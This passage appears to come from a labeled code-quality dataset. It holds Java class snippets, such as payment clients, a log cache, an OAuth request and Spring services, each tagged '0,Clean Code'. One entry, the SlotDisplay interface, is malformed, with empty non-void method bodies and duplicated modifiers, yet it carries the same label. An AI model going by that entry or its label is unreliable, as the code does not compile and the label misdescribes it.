    clientClass.put(WX_APP,WxAppPayClient.class);
    clientClass.put(WX_BAR,WxBarPayClient.class);
    clientClass.put(WX_NATIVE,WxNativePayClient.class);
    clientClass.put(WX_WAP,WxWapPayClient.class);
    clientClass.put(ALIPAY_WAP,AlipayWapPayClient.class);
    clientClass.put(ALIPAY_QR,AlipayQrPayClient.class);
    clientClass.put(ALIPAY_APP,AlipayAppPayClient.class);
    clientClass.put(ALIPAY_PC,AlipayPcPayClient.class);
    clientClass.put(ALIPAY_BAR,AlipayBarPayClient.class);
    clientClass.put(MOCK,MockPayClient.class);
  }
  @Override public void registerPayClientClass(  PayChannelEnum channel,  Class<?> payClientClass){
    clientClass.put(channel,payClientClass);
  }
  @Override public PayClient getPayClient(  Long channelId){
    AbstractPayClient<?> client=clients.get(channelId);
    if (client == null) {
      log.error(""[getPayClient][渠道编号({}) 找不到客户端]"",channelId);
    }
    return client;
  }
  @Override @SuppressWarnings(""unchecked"") public <Config extends PayClientConfig>PayClient createOrUpdatePayClient(  Long channelId,  String channelCode,  Config config){
    AbstractPayClient<Config> client=(AbstractPayClient<Config>)clients.get(channelId);
    if (client == null) {
      client=this.createPayClient(channelId,channelCode,config);
      client.init();
      clients.put(client.getId(),client);
    }
 else {
      client.refresh(config);
    }
    return client;
  }
  @SuppressWarnings(""unchecked"") private <Config extends PayClientConfig>AbstractPayClient<Config> createPayClient(  Long channelId,  String channelCode,  Config config){
    PayChannelEnum channelEnum=PayChannelEnum.getByCode(channelCode);
    Assert.notNull(channelEnum,String.format(""支付渠道(%s) 为空"",channelCode));
    Class<?> payClientClass=clientClass.get(channelEnum);
    Assert.notNull(payClientClass,String.format(""支付渠道(%s) Class 为空"",channelCode));
    return (AbstractPayClient<Config>)ReflectUtil.newInstance(payClientClass,channelId,config);
  }
}
",0,Clean Code
"public class URIQueryDecoder {
  private static final String TAG=""URIQueryDecoder"";
  /** 
 * Decodes the query portion of the passed-in URI.
 * @param encodedURI the URI containing the query to decode
 * @param results a map containing all query parameters. Query parameters that do not have avalue will map to a null string
 */
  static public void DecodeQuery(  URI encodedURI,  Map<String,String> results){
    Scanner scanner=new Scanner(encodedURI.getRawQuery());
    scanner.useDelimiter(""&"");
    try {
      while (scanner.hasNext()) {
        String param=scanner.next();
        String[] valuePair=param.split(""="");
        String name, value;
        if (valuePair.length == 1) {
          value=null;
        }
 else         if (valuePair.length == 2) {
          value=URLDecoder.decode(valuePair[1],""UTF-8"");
        }
 else {
          throw new IllegalArgumentException(""query parameter invalid"");
        }
        name=URLDecoder.decode(valuePair[0],""UTF-8"");
        results.put(name,value);
      }
    }
 catch (    UnsupportedEncodingException e) {
      Log.e(TAG,""UTF-8 Not Recognized as a charset.  Device configuration Error."");
    }
  }
}
",0,Clean Code
"public class MountLogCache extends AbstractLogCache {
  private static final Logger logger=LoggerFactory.getLogger(MountLogCache.class);
class CircularQueue {
    private int max;
    private String[] elements;
    private int front, rear, count;
    CircularQueue(){
      this((Integer)AccessibleExecutorConfiguration.ENGINECONN_LOG_CACHE_NUM().getValue());
    }
    CircularQueue(    int max){
      this.max=max;
      this.elements=new String[max];
    }
    public boolean isEmpty(){
      return count == 0;
    }
    public synchronized void enqueue(    String value){
      if (count == max) {
        logger.debug(""Queue is full, log: {} needs to be dropped"",value);
      }
 else {
        rear=(rear + 1) % max;
        elements[rear]=value;
        count++;
      }
    }
    public String dequeue(){
      if (count == 0) {
        logger.debug(""Queue is empty, nothing to get"");
        return null;
      }
 else {
        front=(front + 1) % max;
        count--;
        return elements[front];
      }
    }
    public List<String> dequeue(    int num){
      List<String> list=new ArrayList<>();
      int index=0;
      while (index < num) {
        String tempLog=dequeue();
        if (StringUtils.isNotEmpty(tempLog)) {
          list.add(tempLog);
        }
 else         if (tempLog == null) {
          break;
        }
        index++;
      }
      return list;
    }
    public synchronized List<String> getRemain(){
      List<String> list=new ArrayList<>();
      while (!isEmpty()) {
        list.add(dequeue());
      }
      return list;
    }
    public int size(){
      return count;
    }
  }
  private CircularQueue logs;
  public MountLogCache(  int loopMax){
    this.logs=new CircularQueue(loopMax);
  }
  @Override public void cacheLog(  String log){
    logs.enqueue(log);
  }
  @Override public List<String> getLog(  int num){
    return logs.dequeue(num);
  }
  @Override public synchronized List<String> getRemain(){
    return logs.getRemain();
  }
  @Override public int size(){
    return logs.size();
  }
}",0,Clean Code
"public class KEventWaiter extends AbstractWaiter implements Waiter {
  private static final Logger log=LoggerFactory.getLogger(KEventWaiter.class);
  private final KEvent event;
  private final Pointer eventlist;
  private final int nevents;
  public KEventWaiter(  KEvent event,  Pointer eventlist,  int nevents){
    this.event=event;
    this.eventlist=eventlist;
    this.nevents=nevents;
  }
  @Override public boolean canDispatch(){
    return !event.pendingEventList.isEmpty();
  }
  @Override public void onContinueRun(  Emulator<?> emulator){
    int size=UnidbgStructure.calculateSize(KEvent64.class);
    Pointer ptr=eventlist;
    int i=0;
    for (; i < nevents && !event.pendingEventList.isEmpty(); i++, ptr=ptr.share(size)) {
      KEvent64 pending=event.pendingEventList.remove(0);
      KEvent64 kev=new KEvent64(ptr);
      kev.copy(pending);
      kev.pack();
      if (log.isDebugEnabled()) {
        log.debug(""onContinueRun i={}, kev={}"",i,kev);
      }
    }
    Backend backend=emulator.getBackend();
    if (emulator.is32Bit()) {
      backend.reg_write(ArmConst.UC_ARM_REG_R0,i);
    }
 else {
      backend.reg_write(Arm64Const.UC_ARM64_REG_X0,i);
    }
  }
}
",0,Clean Code
"/** 
 * Created by qiaoruikai on 2019/2/28 12:00 PM.
 */
public class ColorFilterRelativeLayout extends RelativeLayout {
  private Paint m_paint;
  public ColorFilterRelativeLayout(  Context context){
    this(context,null);
  }
  public ColorFilterRelativeLayout(  Context context,  AttributeSet attrs){
    this(context,attrs,0);
  }
  public ColorFilterRelativeLayout(  Context context,  AttributeSet attrs,  int defStyleAttr){
    super(context,attrs,defStyleAttr);
    _Init();
  }
  @TargetApi(21) public ColorFilterRelativeLayout(  Context context,  AttributeSet attrs,  int defStyleAttr,  int defStyleRes){
    super(context,attrs,defStyleAttr,defStyleRes);
    _Init();
  }
  private void _Init(){
    ColorMatrix cm=new ColorMatrix();
    cm.setSaturation(1);
    m_paint=new Paint();
    m_paint.setColorFilter(new ColorMatrixColorFilter(cm));
  }
  @Override protected void dispatchDraw(  Canvas canvas){
    canvas.saveLayer(null,m_paint,Canvas.ALL_SAVE_FLAG);
    super.dispatchDraw(canvas);
    canvas.restore();
  }
  /** 
 * 重设饱和度
 * @param saturation
 */
  public void setSaturation(  float saturation){
    ColorMatrix cm=new ColorMatrix();
    cm.setSaturation(saturation);
    m_paint.setColorFilter(new ColorMatrixColorFilter(cm));
    invalidate();
  }
}",0,Clean Code
"/** 
 * @author cai.wen
 * @date 19-1-17
 */
class StatParser {
  private static final Logger LOGGER=LoggerFactory.getLogger(StatParser.class);
  private static final Splitter SPACE_SPLITTER=Splitter.on("" "").omitEmptyStrings();
  private static final StatParser INSTANCE=new StatParser();
  private static final String PROC_PATH=""/proc"";
  private StatParser(){
  }
  public CpuState parseCpuInfo() throws IOException {
    File procDir=new File(PROC_PATH);
    if (!procDir.exists()) {
      throw new IllegalStateException(""can't get proc directory"");
    }
    return CpuState.parse(getInfoList(new File(procDir,""stat"")));
  }
  public ThreadState parseThreadInfo(  int pid,  int tid) throws IOException {
    File pidDir=new File(PROC_PATH,String.valueOf(pid));
    if (!pidDir.exists()) {
      throw new IllegalStateException(""can not open pid directory : "" + pidDir.getAbsoluteFile());
    }
    File tidDir=new File(pidDir,""task/"" + String.valueOf(tid));
    if (!tidDir.exists()) {
      LOGGER.info(""can not open tid directory : {}"",tidDir.getAbsoluteFile());
      return null;
    }
    return ThreadState.parse(getInfoList(new File(tidDir,""stat"")));
  }
  public ProcessState parseProcessInfo(  int pid) throws IOException {
    File pidDir=new File(PROC_PATH,String.valueOf(pid));
    if (!pidDir.exists()) {
      throw new IllegalStateException(""can not open pid directory : "" + pidDir.getAbsoluteFile());
    }
    return ProcessState.parse(getInfoList(new File(pidDir,""stat"")));
  }
  private List<String> getInfoList(  File file) throws IOException {
    return SPACE_SPLITTER.splitToList(Files.toString(file,Charsets.UTF_8));
  }
  public static StatParser getInstance(){
    return INSTANCE;
  }
}
",0,Clean Code
"/** 
 * Stack Overflow登录
 * @author hongwei.peng (pengisgood(at)gmail(dot)com)
 * @since 1.9.0
 */
public class AuthStackOverflowRequest extends AuthDefaultRequest {
  public AuthStackOverflowRequest(  AuthConfig config){
    super(config,STACK_OVERFLOW);
  }
  public AuthStackOverflowRequest(  AuthConfig config,  AuthStateCache authStateCache){
    super(config,STACK_OVERFLOW,authStateCache);
  }
  @Override public AuthToken getAccessToken(  AuthCallback authCallback){
    String accessTokenUrl=accessTokenUrl(authCallback.getCode());
    Map<String,String> form=MapUtil.parseStringToMap(accessTokenUrl,false);
    HttpHeader httpHeader=new HttpHeader();
    httpHeader.add(Constants.CONTENT_TYPE,""application/x-www-form-urlencoded"");
    String response=new HttpUtils(config.getHttpConfig()).post(accessTokenUrl,form,httpHeader,false).getBody();
    JSONObject accessTokenObject=JSONObject.parseObject(response);
    this.checkResponse(accessTokenObject);
    return AuthToken.builder().accessToken(accessTokenObject.getString(""access_token"")).expireIn(accessTokenObject.getIntValue(""expires"")).build();
  }
  @Override public AuthUser getUserInfo(  AuthToken authToken){
    String userInfoUrl=UrlBuilder.fromBaseUrl(this.source.userInfo()).queryParam(""access_token"",authToken.getAccessToken()).queryParam(""site"",""stackoverflow"").queryParam(""key"",this.config.getStackOverflowKey()).build();
    String response=new HttpUtils(config.getHttpConfig()).get(userInfoUrl).getBody();
    JSONObject object=JSONObject.parseObject(response);
    this.checkResponse(object);
    JSONObject userObj=object.getJSONArray(""items"").getJSONObject(0);
    return AuthUser.builder().rawUserInfo(userObj).uuid(userObj.getString(""user_id"")).avatar(userObj.getString(""profile_image"")).location(userObj.getString(""location"")).nickname(userObj.getString(""display_name"")).blog(userObj.getString(""website_url"")).gender(AuthUserGender.UNKNOWN).token(authToken).source(source.toString()).build();
  }
  /** 
 * 返回带 {@code state}参数的授权url，授权回调时会带上这个 {@code state}
 * @param state state 验证授权流程的参数，可以防止csrf
 * @return 返回授权地址
 * @since 1.9.3
 */
  @Override public String authorize(  String state){
    return UrlBuilder.fromBaseUrl(super.authorize(state)).queryParam(""scope"",this.getScopes("","",false,AuthScopeUtils.getDefaultScopes(AuthStackoverflowScope.values()))).build();
  }
  /** 
 * 检查响应内容是否正确
 * @param object 请求响应内容
 */
  private void checkResponse(  JSONObject object){
    if (object.containsKey(""error"")) {
      throw new AuthException(object.getString(""error_description""));
    }
  }
}
",0,Clean Code
"/** 
 * An  {@link InputStream} implementation delegating all methods to another InputStream.Can be used as a base-class for other InputStream implementations that wrap around an existing stream and only want to modify certain methods.
 */
public abstract class DelegateInputStream extends InputStream {
  protected final InputStream in;
  public DelegateInputStream(  InputStream in){
    this.in=in;
  }
  @Override public int read() throws IOException {
    return in.read();
  }
  @Override public int read(  byte @NotNull [] b) throws IOException {
    return in.read(b);
  }
  @Override public int read(  byte @NotNull [] b,  int off,  int len) throws IOException {
    return in.read(b,off,len);
  }
  @Override public byte[] readAllBytes() throws IOException {
    return in.readAllBytes();
  }
  @Override public byte[] readNBytes(  int len) throws IOException {
    return in.readNBytes(len);
  }
  @Override public int readNBytes(  byte[] b,  int off,  int len) throws IOException {
    return in.readNBytes(b,off,len);
  }
  @Override public long skip(  long n) throws IOException {
    return in.skip(n);
  }
  @Override public int available() throws IOException {
    return in.available();
  }
  @Override public void close() throws IOException {
    in.close();
  }
  @Override public boolean markSupported(){
    return in.markSupported();
  }
  @Override public synchronized void mark(  int readlimit){
    in.mark(readlimit);
  }
  @Override public synchronized void reset() throws IOException {
    in.reset();
  }
  @Override public long transferTo(  OutputStream out) throws IOException {
    return in.transferTo(out);
  }
}
",0,Clean Code
"/** 
 * Output stream of code units, for writing out Dalvik bytecode. 
 */
public interface CodeOutput extends CodeCursor {
  /** 
 * Writes a code unit. 
 */
  void write(  short codeUnit);
  /** 
 * Writes two code units. 
 */
  void write(  short u0,  short u1);
  /** 
 * Writes three code units. 
 */
  void write(  short u0,  short u1,  short u2);
  /** 
 * Writes four code units. 
 */
  void write(  short u0,  short u1,  short u2,  short u3);
  /** 
 * Writes five code units. 
 */
  void write(  short u0,  short u1,  short u2,  short u3,  short u4);
  /** 
 * Writes an  {@code int}, little-endian. 
 */
  void writeInt(  int value);
  /** 
 * Writes a  {@code long}, little-endian. 
 */
  void writeLong(  long value);
  /** 
 * Writes the contents of the given array. 
 */
  void write(  byte[] data);
  /** 
 * Writes the contents of the given array. 
 */
  void write(  short[] data);
  /** 
 * Writes the contents of the given array. 
 */
  void write(  int[] data);
  /** 
 * Writes the contents of the given array. 
 */
  void write(  long[] data);
}
",0,Clean Code
"/** 
 * See <a href=""https://public.dhe.ibm.com/software/dw/webservices/ws-mqtt/mqtt-v3r1.html#publish"">MQTTV3.1/publish</a>
 */
public class MqttPublishMessage extends MqttMessage implements ByteBufHolder {
  public MqttPublishMessage(  MqttFixedHeader mqttFixedHeader,  MqttPublishVariableHeader variableHeader,  ByteBuf payload){
    super(mqttFixedHeader,variableHeader,payload);
  }
  @Override public MqttPublishVariableHeader variableHeader(){
    return (MqttPublishVariableHeader)super.variableHeader();
  }
  @Override public ByteBuf payload(){
    return content();
  }
  @Override public ByteBuf content(){
    return ByteBufUtil.ensureAccessible((ByteBuf)super.payload());
  }
  @Override public MqttPublishMessage copy(){
    return replace(content().copy());
  }
  @Override public MqttPublishMessage duplicate(){
    return replace(content().duplicate());
  }
  @Override public MqttPublishMessage retainedDuplicate(){
    return replace(content().retainedDuplicate());
  }
  @Override public MqttPublishMessage replace(  ByteBuf content){
    return new MqttPublishMessage(fixedHeader(),variableHeader(),content);
  }
  @Override public int refCnt(){
    return content().refCnt();
  }
  @Override public MqttPublishMessage retain(){
    content().retain();
    return this;
  }
  @Override public MqttPublishMessage retain(  int increment){
    content().retain(increment);
    return this;
  }
  @Override public MqttPublishMessage touch(){
    content().touch();
    return this;
  }
  @Override public MqttPublishMessage touch(  Object hint){
    content().touch(hint);
    return this;
  }
  @Override public boolean release(){
    return content().release();
  }
  @Override public boolean release(  int decrement){
    return content().release(decrement);
  }
}
",0,Clean Code
"interface SlotDisplay extends ComponentHolder<SlotDisplay> {
  @NotNull NetworkBuffer.Type<SlotDisplay> NETWORK_TYPE=SlotDisplayType.NETWORK_TYPE.unionType(SlotDisplay::dataSerializer,SlotDisplay::slotDisplayToType);
final class Empty implements SlotDisplay {
    public static final Empty INSTANCE=new Empty();
    public static final NetworkBuffer.Type<Empty> NETWORK_TYPE=NetworkBuffer.UNIT.transform(buffer -> INSTANCE,empty -> Unit.INSTANCE);
    private Empty(){
    }
  }
final class AnyFuel implements SlotDisplay {
    public static final AnyFuel INSTANCE=new AnyFuel();
    public static final NetworkBuffer.Type<AnyFuel> NETWORK_TYPE=NetworkBuffer.UNIT.transform(buffer -> INSTANCE,empty -> Unit.INSTANCE);
    private AnyFuel(){
    }
  }
  record Item(  @NotNull Material material);
  public static final NetworkBuffer.Type<Item> NETWORK_TYPE=NetworkBufferTemplate.template(Material.NETWORK_TYPE,Item::material,Item::new);
  record ItemStack(  @NotNull net.minestom.server.item.ItemStack itemStack);
  public static final NetworkBuffer.Type<ItemStack> NETWORK_TYPE=NetworkBufferTemplate.template(net.minestom.server.item.ItemStack.STRICT_NETWORK_TYPE,ItemStack::itemStack,ItemStack::new);
  @Override public @NotNull Collection<Component> components(){
  }
  @Override public @NotNull SlotDisplay copyWithOperator(  @NotNull UnaryOperator<Component> operator){
  }
  record Tag(  @NotNull String tagKey);
  public static final NetworkBuffer.Type<Tag> NETWORK_TYPE=NetworkBufferTemplate.template(NetworkBuffer.STRING,Tag::tagKey,Tag::new);
  record SmithingTrim(  @NotNull SlotDisplay base,  @NotNull SlotDisplay trimMaterial,  @NotNull SlotDisplay trimPattern);
  public static final NetworkBuffer.Type<SmithingTrim> NETWORK_TYPE=NetworkBufferTemplate.template(SlotDisplay.NETWORK_TYPE,SmithingTrim::base,SlotDisplay.NETWORK_TYPE,SmithingTrim::trimMaterial,SlotDisplay.NETWORK_TYPE,SmithingTrim::trimPattern,SmithingTrim::new);
  @Override public @NotNull Collection<Component> components(){
  }
  @Override public @NotNull SlotDisplay copyWithOperator(  @NotNull UnaryOperator<Component> operator){
  }
  record WithRemainder(  @NotNull SlotDisplay input,  @NotNull SlotDisplay remainder);
  public static final NetworkBuffer.Type<WithRemainder> NETWORK_TYPE=NetworkBufferTemplate.template(SlotDisplay.NETWORK_TYPE,WithRemainder::input,SlotDisplay.NETWORK_TYPE,WithRemainder::remainder,WithRemainder::new);
  @Override public @NotNull Collection<Component> components(){
  }
  @Override public @NotNull SlotDisplay copyWithOperator(  @NotNull UnaryOperator<Component> operator){
  }
  record Composite(  @NotNull List<SlotDisplay> contents);
  public static final NetworkBuffer.Type<Composite> NETWORK_TYPE=NetworkBufferTemplate.template(SlotDisplay.NETWORK_TYPE.list(),Composite::contents,Composite::new);
  public @Override public @NotNull Collection<Component> components(){
  }
  @Override public @NotNull SlotDisplay copyWithOperator(  @NotNull UnaryOperator<Component> operator){
  }
  @Override default @NotNull Collection<Component> components(){
    return List.of();
  }
  @Override default @NotNull SlotDisplay copyWithOperator(  @NotNull UnaryOperator<Component> operator){
    return this;
  }
  private static NetworkBuffer.Type<SlotDisplay> dataSerializer(  @NotNull SlotDisplayType type){
    return (NetworkBuffer.Type<SlotDisplay>)null;
  }
  private static SlotDisplayType slotDisplayToType(  @NotNull SlotDisplay slotDisplay){
    return null;
  }
}
",0,Clean Code
"/** 
 * {@link ModuleInfoController}<p> 在线模块页面
 * @author zhaoyb1990
 */
@RequestMapping(""/module"") @Controller public class ModuleInfoController {
  @Resource private ModuleInfoService moduleInfoService;
  @RequestMapping(""list.htm"") public String list(  @ModelAttribute(""requestParams"") ModuleInfoParams params,  Model model){
    PageResult<ModuleInfoBO> result=moduleInfoService.query(params);
    PagerAdapter.transform0(result,model);
    return ""module/list"";
  }
  @ResponseBody @RequestMapping(""/byName.json"") public RepeaterResult<List<ModuleInfoBO>> list(  @RequestParam(""appName"") String appName){
    return moduleInfoService.query(appName);
  }
  @ResponseBody @RequestMapping(""/report.json"") public RepeaterResult<ModuleInfoBO> list(  @ModelAttribute(""requestParams"") ModuleInfoBO params){
    return moduleInfoService.report(params);
  }
  @ResponseBody @RequestMapping(""/active.json"") public RepeaterResult<ModuleInfoBO> active(  @ModelAttribute(""requestParams"") ModuleInfoParams params){
    return moduleInfoService.active(params);
  }
  @ResponseBody @RequestMapping(""/frozen.json"") public RepeaterResult<ModuleInfoBO> frozen(  @ModelAttribute(""requestParams"") ModuleInfoParams params){
    return moduleInfoService.frozen(params);
  }
  @ResponseBody @RequestMapping(""/install.json"") public RepeaterResult<String> install(  @ModelAttribute(""requestParams"") ModuleInfoParams params){
    return moduleInfoService.install(params);
  }
  @ResponseBody @RequestMapping(""/reload.json"") public RepeaterResult<String> reload(  @ModelAttribute(""requestParams"") ModuleInfoParams params){
    return moduleInfoService.reload(params);
  }
}
",0,Clean Code
"/** 
 * 首页 Banner Service 接口
 * @author xia
 */
public interface BannerService {
  /** 
 * 创建 Banner
 * @param createReqVO 创建信息
 * @return 编号
 */
  Long createBanner(  @Valid BannerCreateReqVO createReqVO);
  /** 
 * 更新 Banner
 * @param updateReqVO 更新信息
 */
  void updateBanner(  @Valid BannerUpdateReqVO updateReqVO);
  /** 
 * 删除 Banner
 * @param id 编号
 */
  void deleteBanner(  Long id);
  /** 
 * 获得 Banner
 * @param id 编号
 * @return Banner
 */
  BannerDO getBanner(  Long id);
  /** 
 * 获得 Banner 分页
 * @param pageReqVO 分页查询
 * @return Banner分页
 */
  PageResult<BannerDO> getBannerPage(  BannerPageReqVO pageReqVO);
  /** 
 * 增加 Banner 点击量
 * @param id Banner编号
 */
  void addBannerBrowseCount(  Long id);
  /** 
 * 获得 Banner 列表
 * @param position 定位
 * @return Banner 列表
 */
  List<BannerDO> getBannerListByPosition(  Integer position);
}
",0,Clean Code
"/** 
 * Detects whether the application should be using AOT-generated classes at runtime.
 * @author Brian Clozel
 * @author Sebastien Deleuze
 */
public abstract class AotModeDetector {
  private static final String GENERATED_CLASS=""org.springframework.aot.StaticSpringFactories"";
  private static final boolean generatedClassPresent=ClassUtils.isPresent(GENERATED_CLASS,null);
  private static final boolean aotTestClassPresent=ClassUtils.isPresent(""org.springframework.aot.test.context.bootstrap.generator.AotTestContextProcessor"",null);
  /** 
 * Returns whether AOT-generated code should be considered at runtime.
 * @return {@code true} only if:<ul> <li>The  {@code ""springAot""} system property is set<li>or  {@link NativeDetector#inNativeImage()} returns true</ul>
 */
  public static boolean isAotModeEnabled(){
    if (""true"".equals(System.getProperty(""springAot"")) || NativeDetector.inNativeImage()) {
      if (!generatedClassPresent) {
        throw new GeneratedClassNotFoundException(GENERATED_CLASS);
      }
      return true;
    }
    return false;
  }
  /** 
 * @return {@code true} when running AOT tests
 */
  public static boolean isRunningAotTests(){
    return ""org.springframework.aot.test.AotCacheAwareContextLoaderDelegate"".equals(SpringProperties.getProperty(""spring.test.context.default.CacheAwareContextLoaderDelegate""));
  }
  /** 
 * @return {@code true} when generating AOT tests
 */
  public static boolean isGeneratingAotTests(){
    return aotTestClassPresent;
  }
}
",0,Clean Code
"/** 
 * Server state controller.
 * @author xingxuechao on:2019/2/27 11:17 AM
 */
@RestController @RequestMapping(""/v1/console/server"") @ExtractorManager.Extractor(httpExtractor=ConsoleDefaultHttpParamExtractor.class) public class ServerStateController {
  private static final String ANNOUNCEMENT_FILE=""announcement.conf"";
  private static final String GUIDE_FILE=""console-guide.conf"";
  /** 
 * Get server state of current server.
 * @return state json.
 */
  @GetMapping(""/state"") public ResponseEntity<Map<String,String>> serverState(){
    Map<String,String> serverState=new HashMap<>(4);
    for (    ModuleState each : ModuleStateHolder.getInstance().getAllModuleStates()) {
      each.getStates().forEach((s,o) -> serverState.put(s,null == o ? null : o.toString()));
    }
    return ResponseEntity.ok().body(serverState);
  }
  @GetMapping(""/announcement"") public RestResult<String> getAnnouncement(  @RequestParam(required=false,name=""language"",defaultValue=""zh-CN"") String language){
    String file=ANNOUNCEMENT_FILE.substring(0,ANNOUNCEMENT_FILE.length() - 5) + ""_"" + language+ "".conf"";
    if (file.contains(TOP_PATH) || file.contains(FOLDER_SEPARATOR) || file.contains(WINDOWS_FOLDER_SEPARATOR)) {
      throw new IllegalArgumentException(""Invalid filename"");
    }
    File announcementFile=new File(EnvUtil.getConfPath(),file);
    String announcement=null;
    if (announcementFile.exists() && announcementFile.isFile()) {
      announcement=DiskUtils.readFile(announcementFile);
    }
    return RestResultUtils.success(announcement);
  }
  @GetMapping(""/guide"") public RestResult<String> getConsoleUiGuide(){
    File guideFile=new File(EnvUtil.getConfPath(),GUIDE_FILE);
    String guideInformation=null;
    if (guideFile.exists() && guideFile.isFile()) {
      guideInformation=DiskUtils.readFile(guideFile);
    }
    return RestResultUtils.success(guideInformation);
  }
}
",0,Clean Code
"/** 
 * User cache.
 * @author <a href=""http://88250.b3log.org"">Liang Ding</a>
 * @version 1.1.0.1, Jul 30, 2018
 * @since 1.4.0
 */
@Singleton public class UserCache {
  /** 
 * Id, User.
 */
  private static final Map<String,JSONObject> ID_CACHE=new ConcurrentHashMap<>();
  /** 
 * Name, User.
 */
  private static final Map<String,JSONObject> NAME_CACHE=new ConcurrentHashMap<>();
  /** 
 * Administrators cache.
 */
  private static final List<JSONObject> ADMINS_CACHE=new CopyOnWriteArrayList<>();
  /** 
 * Gets admins.
 * @return admins
 */
  public List<JSONObject> getAdmins(){
    return ADMINS_CACHE;
  }
  /** 
 * Puts the specified admins.
 * @param admins the specified admins
 */
  public void putAdmins(  final List<JSONObject> admins){
    ADMINS_CACHE.clear();
    ADMINS_CACHE.addAll(admins);
  }
  /** 
 * Gets a user by the specified user id.
 * @param userId the specified user id
 * @return user, returns {@code null} if not found
 */
  public JSONObject getUser(  final String userId){
    final JSONObject user=ID_CACHE.get(userId);
    if (null == user) {
      return null;
    }
    return JSONs.clone(user);
  }
  /** 
 * Gets a user by the specified user name.
 * @param userName the specified user name
 * @return user, returns {@code null} if not found
 */
  public JSONObject getUserByName(  final String userName){
    final JSONObject user=NAME_CACHE.get(userName);
    if (null == user) {
      return null;
    }
    return JSONs.clone(user);
  }
  /** 
 * Adds or updates the specified user.
 * @param user the specified user
 */
  public void putUser(  final JSONObject user){
    ID_CACHE.put(user.optString(Keys.OBJECT_ID),JSONs.clone(user));
    NAME_CACHE.put(user.optString(User.USER_NAME),JSONs.clone(user));
    Sessions.put(user.optString(Keys.OBJECT_ID),user);
  }
  /** 
 * Removes the the specified user.
 * @param user the specified user
 */
  public void removeUser(  final JSONObject user){
    ID_CACHE.remove(user.optString(Keys.OBJECT_ID));
    NAME_CACHE.remove(user.optString(User.USER_NAME));
  }
}
",0,Clean Code
"/** 
 * 秒杀活动商品 Mapper
 * @author halfninety
 */
@Mapper public interface SeckillProductMapper extends BaseMapperX<SeckillProductDO> {
  default List<SeckillProductDO> selectListByActivityId(  Long activityId){
    return selectList(SeckillProductDO::getActivityId,activityId);
  }
  default SeckillProductDO selectByActivityIdAndSkuId(  Long activityId,  Long skuId){
    return selectOne(SeckillProductDO::getActivityId,activityId,SeckillProductDO::getSkuId,skuId);
  }
  default List<SeckillProductDO> selectListByActivityId(  Collection<Long> ids){
    return selectList(SeckillProductDO::getActivityId,ids);
  }
  /** 
 * 更新活动库存（减少）
 * @param id    活动编号
 * @param count 扣减的库存数量(减少库存)
 * @return 影响的行数
 */
  default int updateStockDecr(  Long id,  int count){
    Assert.isTrue(count > 0);
    return update(null,new LambdaUpdateWrapper<SeckillProductDO>().eq(SeckillProductDO::getId,id).ge(SeckillProductDO::getStock,count).setSql(""stock = stock - "" + count));
  }
  /** 
 * 更新活动库存（增加）
 * @param id    活动编号
 * @param count 需要增加的库存（增加库存）
 * @return 影响的行数
 */
  default int updateStockIncr(  Long id,  int count){
    Assert.isTrue(count > 0);
    return update(null,new LambdaUpdateWrapper<SeckillProductDO>().eq(SeckillProductDO::getId,id).setSql(""stock = stock + "" + count));
  }
}
",0,Clean Code
"/** 
 * Instruction which possibly throws. The  {@code successors} list in thebasic block an instance of this class is inside corresponds in-order to the list of exceptions handled by this instruction, with the no-exception case appended as the final target.
 */
public final class ThrowingInsn extends Insn {
  /** 
 * {@code non-null;} list of exceptions caught 
 */
  private final TypeList catches;
  /** 
 * Gets the string form of a register spec list to be used as a catches list.
 * @param catches {@code non-null;} the catches list
 * @return {@code non-null;} the string form
 */
  public static String toCatchString(  TypeList catches){
    StringBuilder sb=new StringBuilder(100);
    sb.append(""catch"");
    int sz=catches.size();
    for (int i=0; i < sz; i++) {
      sb.append("" "");
      sb.append(catches.getType(i).toHuman());
    }
    return sb.toString();
  }
  /** 
 * Constructs an instance.
 * @param opcode {@code non-null;} the opcode
 * @param position {@code non-null;} source position
 * @param sources {@code non-null;} specs for all the sources
 * @param catches {@code non-null;} list of exceptions caught
 */
  public ThrowingInsn(  Rop opcode,  SourcePosition position,  RegisterSpecList sources,  TypeList catches){
    super(opcode,position,null,sources);
    if (opcode.getBranchingness() != Rop.BRANCH_THROW) {
      throw new IllegalArgumentException(""opcode with invalid branchingness: "" + opcode.getBranchingness());
    }
    if (catches == null) {
      throw new NullPointerException(""catches == null"");
    }
    this.catches=catches;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public String getInlineString(){
    return toCatchString(catches);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public TypeList getCatches(){
    return catches;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public void accept(  Visitor visitor){
    visitor.visitThrowingInsn(this);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Insn withAddedCatch(  Type type){
    return new ThrowingInsn(getOpcode(),getPosition(),getSources(),catches.withAddedType(type));
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Insn withRegisterOffset(  int delta){
    return new ThrowingInsn(getOpcode(),getPosition(),getSources().withOffset(delta),catches);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public Insn withNewRegisters(  RegisterSpec result,  RegisterSpecList sources){
    return new ThrowingInsn(getOpcode(),getPosition(),sources,catches);
  }
}
",0,Clean Code
"public class ScreenOnNotificationActivity extends CommonFuncToggleAppListFilterActivity {
  public static void start(  Context context){
    ActivityUtils.startActivity(context,ScreenOnNotificationActivity.class);
  }
  @NonNull @Override protected String getTitleString(){
    return getString(github.tornaco.android.thanos.res.R.string.feature_title_light_on_notification);
  }
  @NonNull @Override protected OnAppItemSelectStateChangeListener onCreateAppItemSelectStateChangeListener(){
    return (appInfo,selected) -> ThanosManager.from(getApplicationContext()).ifServiceInstalled(thanosManager -> thanosManager.getNotificationManager().setScreenOnNotificationEnabledForPkg(appInfo.getPkgName(),selected));
  }
  @NonNull @Override protected CommonFuncToggleAppListFilterViewModel.ListModelLoader onCreateListModelLoader(){
    AppListItemDescriptionComposer composer=new AppListItemDescriptionComposer(thisActivity());
    return index -> {
      ThanosManager thanos=ThanosManager.from(getApplicationContext());
      if (!thanos.isServiceInstalled())       return Lists.newArrayListWithCapacity(0);
      List<AppInfo> installed=thanos.getPkgManager().getInstalledPkgsByPackageSetId(index.pkgSetId);
      List<AppListModel> res=new ArrayList<>();
      CollectionUtils.consumeRemaining(installed,appInfo -> {
        appInfo.setSelected(thanos.getNotificationManager().isScreenOnNotificationEnabledForPkg(appInfo.getPkgName()));
        res.add(new AppListModel(appInfo,null,null,composer.getAppItemDescription(appInfo)));
      }
);
      Collections.sort(res);
      return res;
    }
;
  }
